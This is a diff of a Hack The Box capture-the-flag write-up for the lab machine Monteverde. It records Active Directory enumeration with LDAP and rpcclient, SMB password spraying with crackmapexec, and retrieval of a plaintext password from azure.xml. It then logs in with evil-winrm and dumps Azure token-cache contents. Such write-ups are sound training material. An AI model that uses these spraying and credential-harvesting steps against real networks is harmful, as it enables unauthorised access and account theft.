@@ -1,14 +1,42 @@
+# HTB - Monteverde
+
+## Overview
+
+![](../.gitbook/assets/screenshot-at-2020-06-13-00-54-41.png)
+
+&lt;Short description to include any strange things to be dealt with&gt; 
+
+Useful Skills and Tools
+
+#### &lt;Useful thing 1&gt;
+
+&lt;description with generic example&gt;
+
+#### &lt;Useful thing 2&gt;
+
+&lt;description with generic example&gt;
+
+#### Bruteforcing SMB login with only usernames
+
+`crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`
+
+## Enumeration
+
+### Nmap scan
 
 Initial attempt at nmap scan failed
-```
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ nmap -sC -sV -oA monteverde 10.10.10.172
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 10:42 EDT
 Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
 
 Nmap done: 1 IP address (0 hosts up) scanned in 3.27 seconds
 ```
-adding `-Pn` fixed (like on htb:nest)
-```
+
+adding `-Pn` fixed \(like on htb:nest\)
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ nmap -p- -sC -sV -Pn -oA monteverde-full -vvv 10.10.10.172
 
 # Nmap 7.80 scan initiated Thu May 28 13:42:58 2020 as: nmap -p- -sC -sV -Pn -oA monteverde-full -vvv 10.10.10.172
@@ -69,8 +97,427 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu May 28 13:55:16 2020 -- 1 IP address (1 host up) scanned in 738.00 seconds
 ```
-	...Windows AD Machine...lots of enumeration...add ldap first...
+
+```text
+zweilos@kalimaa:~/htb/monteverde$ ldapsearch -H ldap://10.10.10.172:3268 -x -LLL -s base -b "DC=megabank,DC=local"
+dn: DC=megabank,DC=local
+
+...snipped for brevity...
+
+dn: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Remote Management Users
+description: Members of this group can access WMI resources over management pr
+ otocols (such as WS-Management via the Windows Remote Management service). Th
+ is applies only to WMI namespaces that grant access to the user.
+member: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+distinguishedName: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200102220522.0Z
+whenChanged: 20200102234321.0Z
+uSNCreated: 8231
+uSNChanged: 28733
+name: Remote Management Users
+objectGUID:: 0Mscqceg80SarcEgGhvktQ==
+objectSid:: AQIAAAAAAAUgAAAARAIAAA==
+sAMAccountName: Remote Management Users
+sAMAccountType: 536870912
+groupType: -2147483643
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103123551.0Z
+dSCorePropagationData: 20200102220603.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+...snipped for brevity...
+
+dn: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Mike Hope
+sn: Hope
+givenName: Mike
+distinguishedName: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOC
+ AL
+instanceType: 4
+whenCreated: 20200102234005.0Z
+whenChanged: 20200524135445.0Z
+displayName: Mike Hope
+uSNCreated: 28724
+memberOf: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+memberOf: CN=Remote Management Users,CN=Builtin,DC=MEGABANK,DC=LOCAL
+uSNChanged: 65568
+name: Mike Hope
+objectGUID:: +W/bvN0OPkWmWWupohoYJw==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UQQYAAA==
+sAMAccountName: mhope
+sAMAccountType: 805306368
+userPrincipalName: mhope@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103123551.0Z
+dSCorePropagationData: 20200102234005.0Z
+dSCorePropagationData: 16010101000001.0Z
+lastLogonTimestamp: 132348020858080973
+
+dn: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Azure Admins
+member: CN=Mike Hope,OU=London,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+member: CN=AAD_987d7f2f57d2,CN=Users,DC=MEGABANK,DC=LOCAL
+member: CN=Administrator,CN=Users,DC=MEGABANK,DC=LOCAL
+distinguishedName: CN=Azure Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103001011.0Z
+whenChanged: 20200103001032.0Z
+uSNCreated: 36889
+uSNChanged: 36897
+name: Azure Admins
+objectGUID:: iCAImwQrNUW6YeEQTXxy+w==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKQoAAA==
+sAMAccountName: Azure Admins
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103123551.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+dn: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: SABatchJobs
+givenName: SABatchJobs
+distinguishedName: CN=SABatchJobs,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103124846.0Z
+whenChanged: 20200524144802.0Z
+displayName: SABatchJobs
+uSNCreated: 41070
+uSNChanged: 65906
+name: SABatchJobs
+objectGUID:: A2gA4Cnwv0eHK29I4GEMLQ==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKgoAAA==
+sAMAccountName: SABatchJobs
+sAMAccountType: 805306368
+userPrincipalName: SABatchJobs@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103124846.0Z
+dSCorePropagationData: 16010101000000.0Z
+lastLogonTimestamp: 132348052829557977
+
+dn: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: svc-ata
+givenName: svc-ata
+distinguishedName: CN=svc-ata,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103125831.0Z
+whenChanged: 20200103134739.0Z
+displayName: svc-ata
+uSNCreated: 41086
+uSNChanged: 41246
+name: svc-ata
+objectGUID:: f6KUWDDWtUaHZ/TAQSOZXw==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UKwoAAA==
+sAMAccountName: svc-ata
+sAMAccountType: 805306368
+userPrincipalName: svc-ata@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103125831.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: svc-bexec
+givenName: svc-bexec
+distinguishedName: CN=svc-bexec,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103125955.0Z
+whenChanged: 20200103134739.0Z
+displayName: svc-bexec
+uSNCreated: 41101
+uSNChanged: 41247
+name: svc-bexec
+objectGUID:: klT6nv0Dh0ufrbJXcL21TA==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULAoAAA==
+sAMAccountName: svc-bexec
+sAMAccountType: 805306368
+userPrincipalName: svc-bexec@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103125955.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: svc-netapp
+givenName: svc-netapp
+distinguishedName: CN=svc-netapp,OU=Service Accounts,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130142.0Z
+whenChanged: 20200103134739.0Z
+displayName: svc-netapp
+uSNCreated: 41110
+uSNChanged: 41248
+name: svc-netapp
+objectGUID:: 0huK9EdmGU+LBAJXashjNg==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULQoAAA==
+sAMAccountName: svc-netapp
+sAMAccountType: 805306368
+userPrincipalName: svc-netapp@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103130142.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=File Server Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: File Server Admins
+distinguishedName: CN=File Server Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130214.0Z
+whenChanged: 20200103130214.0Z
+uSNCreated: 41118
+uSNChanged: 41118
+name: File Server Admins
+objectGUID:: XbIZFB31iUu+oE5hb0Gflw==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULgoAAA==
+sAMAccountName: File Server Admins
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Call Recording Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Call Recording Admins
+distinguishedName: CN=Call Recording Admins,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130230.0Z
+whenChanged: 20200103130230.0Z
+uSNCreated: 41122
+uSNChanged: 41122
+name: Call Recording Admins
+objectGUID:: rM9iiw6U/UitOcZPMeyo/g==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3ULwoAAA==
+sAMAccountName: Call Recording Admins
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Reception,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Reception
+distinguishedName: CN=Reception,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130247.0Z
+whenChanged: 20200103130247.0Z
+uSNCreated: 41126
+uSNChanged: 41126
+name: Reception
+objectGUID:: ZiAJfn6gPEey3sgb7mBWkQ==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMAoAAA==
+sAMAccountName: Reception
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Operations
+member: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+distinguishedName: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130300.0Z
+whenChanged: 20200103130930.0Z
+uSNCreated: 41130
+uSNChanged: 41187
+name: Operations
+objectGUID:: HiCe81L9ikCFSReYjd2TPQ==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMQoAAA==
+sAMAccountName: Operations
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Trading
+member: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+distinguishedName: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130306.0Z
+whenChanged: 20200103130829.0Z
+uSNCreated: 41134
+uSNChanged: 41174
+name: Trading
+objectGUID:: FiaPvN1+ykKfaRTytjWQzg==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMgoAAA==
+sAMAccountName: Trading
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: HelpDesk
+member: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+distinguishedName: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130325.0Z
+whenChanged: 20200103130815.0Z
+uSNCreated: 41138
+uSNChanged: 41170
+name: HelpDesk
+objectGUID:: aLZrfWbg1Eyo2mjbtOFWXA==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UMwoAAA==
+sAMAccountName: HelpDesk
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Developers,OU=Groups,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: group
+cn: Developers
+distinguishedName: CN=Developers,OU=Groups,DC=MEGABANK,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130340.0Z
+whenChanged: 20200103130340.0Z
+uSNCreated: 41142
+uSNChanged: 41142
+name: Developers
+objectGUID:: +fTskeAElUaRwaJvDjbehQ==
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNAoAAA==
+sAMAccountName: Developers
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Dimitris Galanos
+sn: Galanos
+givenName: Dimitris
+distinguishedName: CN=Dimitris Galanos,OU=Athens,OU=MegaBank Users,DC=MEGABANK
+ ,DC=LOCAL
+instanceType: 4
+whenCreated: 20200103130610.0Z
+whenChanged: 20200103134739.0Z
+displayName: Dimitris Galanos
+uSNCreated: 41152
+memberOf: CN=Trading,OU=Groups,DC=MEGABANK,DC=LOCAL
+uSNChanged: 41250
+name: Dimitris Galanos
+objectGUID:: PdXCjD6iU0uBUJyxa4g/FA==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNQoAAA==
+sAMAccountName: dgalanos
+sAMAccountType: 805306368
+userPrincipalName: dgalanos@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103130610.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ray O'Leary
+sn: O'Leary
+givenName: Ray
+distinguishedName: CN=Ray O'Leary,OU=Toronto,OU=MegaBank Users,DC=MEGABANK,DC=
+ LOCAL
+instanceType: 4
+whenCreated: 20200103130805.0Z
+whenChanged: 20200103134739.0Z
+displayName: Ray O'Leary
+uSNCreated: 41161
+memberOf: CN=HelpDesk,OU=Groups,DC=MEGABANK,DC=LOCAL
+uSNChanged: 41249
+name: Ray O'Leary
+objectGUID:: 3DFb4iTqDkqLISG92VNrHw==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNgoAAA==
+sAMAccountName: roleary
+sAMAccountType: 805306368
+userPrincipalName: roleary@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103130805.0Z
+dSCorePropagationData: 16010101000000.0Z
+
+dn: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,DC=LOCAL
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Sally Morgan
+sn: Morgan
+givenName: Sally
+distinguishedName: CN=Sally Morgan,OU=New York,OU=MegaBank Users,DC=MEGABANK,D
+ C=LOCAL
+instanceType: 4
+whenCreated: 20200103130921.0Z
+whenChanged: 20200103134739.0Z
+displayName: Sally Morgan
+uSNCreated: 41178
+memberOf: CN=Operations,OU=Groups,DC=MEGABANK,DC=LOCAL
+uSNChanged: 41251
+name: Sally Morgan
+objectGUID:: F60h1VDDkkWl/C8e8bOXuQ==
+userAccountControl: 66048
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAcwNaF5NorjL0aY3UNwoAAA==
+sAMAccountName: smorgan
+sAMAccountType: 805306368
+userPrincipalName: smorgan@MEGABANK.LOCAL
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
+dSCorePropagationData: 20200103130921.0Z
+dSCorePropagationData: 16010101000000.0Z
 ```
+
+ldap returns a vast wealth of information, user list verification done :
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ rpcclient -U "" -N 10.10.10.172
 rpcclient $> enumdomusers
 user:[Guest] rid:[0x1f5]
@@ -110,7 +557,7 @@ group:[Storage Replica Administrators] rid:[0x246]
 
 rpcclient $> queryaliasmem builtin 0x244
         sid:[S-1-5-21-391775091-850290835-3566037492-1601]
-       
+
 rpcclient $> queryuser 1601
         User Name   :   mhope
         Full Name   :   Mike Hope
@@ -139,11 +586,22 @@ rpcclient $> queryuser 1601
         padding1[0..7]...
         logon_hrs[0..21]...
 ```
-	...`mhope` was not able to login without a password, however...
-	
-	...had to figure out which user was correct, no password found, was same as username, created a username list and used it as both user/pass in crackmapexec until one worked...
-	
-```
+
+I was not able to log in as `mhope` without a password, however...possible users found:
+
+* AAD\_987d7f2f57d2
+* mhope
+* SABatchJobs
+* svc-ata
+* svc-bexec
+* svc-netapp
+* dgalanos
+* roleary
+* smorgan
+
+...had to figure out which user was correct, no password found, created a username list and used it as both user/pass in crackmapexec until one worked...username was same as pw for SABatchJobs
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt
 
 SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
@@ -169,10 +627,10 @@ SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:AAD
 SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE 
 SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
 ```
-crackmapexec smb 10.10.10.172 -u users -p users 
 
+crackmapexec smb 10.10.10.172 -u users -p users [https://github.com/byt3bl33d3r/CrackMapExec/wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)
 
-```
+```text
 zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK -L \\\\10.10.10.172\\ -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 
@@ -188,7 +646,8 @@ Enter MEGABANK\SABatchJobs's password:
         users$          Disk      
 SMB1 disabled -- no workgroup available
 ```
-```
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\SYSVOL -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
@@ -208,7 +667,8 @@ smb: \MEGABANK.LOCAL\> ls
 
                 9803775 blocks of size 4096. 4139727 blocks available
 ```
-```
+
+```text
 smb: \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\> ls
   .                                   D        0  Fri Jan  3 07:47:06 2020
   ..                                  D        0  Fri Jan  3 07:47:06 2020
@@ -220,8 +680,10 @@ smb: \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\> l
 smb: \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\> get Registry.pol 
 getting file \MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Registry.pol of size 2792 as Registry.pol (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
 ```
-... https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format
-```
+
+... [https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/registry-policy-file-format)
+
+```text
 smb: \MEGABANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> ls
   .                                   D        0  Thu Jan  2 17:26:34 2020
   ..                                  D        0  Thu Jan  2 17:26:34 2020
@@ -230,10 +692,9 @@ smb: \MEGABANK.LOCAL\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Mic
                 9803775 blocks of size 4096. 4179156 blocks available
 ```
 
-found in:
-\MEGABANK.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\microsoft\Windows NT\SecEdit\GptTmpl.inf
+found in: \MEGABANK.LOCAL\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\microsoft\Windows NT\SecEdit\GptTmpl.inf
 
-```
+```text
 Password policy GptTmpl.inf
 [Unicode]
 Unicode=yes
@@ -260,17 +721,23 @@ Revision=1
 [Registry Values]
 MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
 ```
-	...password policy...other than that nothing at all useful...
 
+```text
+...password policy...other than that nothing at all useful...
 ```
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\azure_uploads -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
-smb: \> 
+smb: \>
+```
 
+```text
+...again nothing...
 ```
-	...again nothing...
-```
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ smbclient -W MEGABANK \\\\10.10.10.172\\users$ -U SABatchJobs
 Enter MEGABANK\SABatchJobs's password: 
 Try "help" to get a list of possible commands.
@@ -293,10 +760,12 @@ smb: \mhope\> ls
 smb: \mhope\> get azure.xml 
 getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
 ```
-	...`mhope` folder contained `azure.xml`...
 
-```xml
+```text
+...`mhope` folder contained `azure.xml`...
+```
 
+```markup
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
   <Obj RefId="0">
     <TN RefId="0">
@@ -313,9 +782,12 @@ getting file \mhope\azure.xml of size 1212 as azure.xml (1.8 KiloBytes/sec) (ave
   </Obj>
 </Objs>
 ```
-	...we have a password for `mhope`!...since mhope was a member of the `Remote Management Users` group...`Evil-WinRM`...
-	
-```powershell
+
+```text
+...we have a password for `mhope`!...since mhope was a member of the `Remote Management Users` group...`Evil-WinRM`...
+```
+
+```text
 zweilos@kalimaa:~/htb/monteverde$ evil-winrm -i 10.10.10.172 -u mhope 
 Enter Password: 
 
@@ -370,8 +842,12 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
 8d6d8cdd486ae85f67feb6096f133cec
 ```
-	...`Azure Admins` group sounds interesting!...
+
+```text
+...`Azure Admins` group sounds interesting!...
 ```
+
+```text
 *Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
 *Evil-WinRM* PS C:\Users\mhope> ls
 
@@ -409,16 +885,21 @@ d-----         1/3/2020   5:35 AM                ErrorRecords
 -a----         1/3/2020   5:31 AM            191 AzureRmContextSettings.json
 -a----         1/3/2020   5:36 AM           7896 TokenCache.dat
 ```
-	...TokenCache.dat..according to () it is simply a json formatted file, containing...
+
+```text
+...TokenCache.dat..according to () it is simply a json formatted file, containing...
 ```
+
+```text
 *Evil-WinRM* PS C:\Users\mhope\.Azure> cat TokenCache.dat
 #https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{"RefreshToken":"AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA","ResourceInResponse":"https:\/\/graph.windows.net\/","Result":{"AccessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNp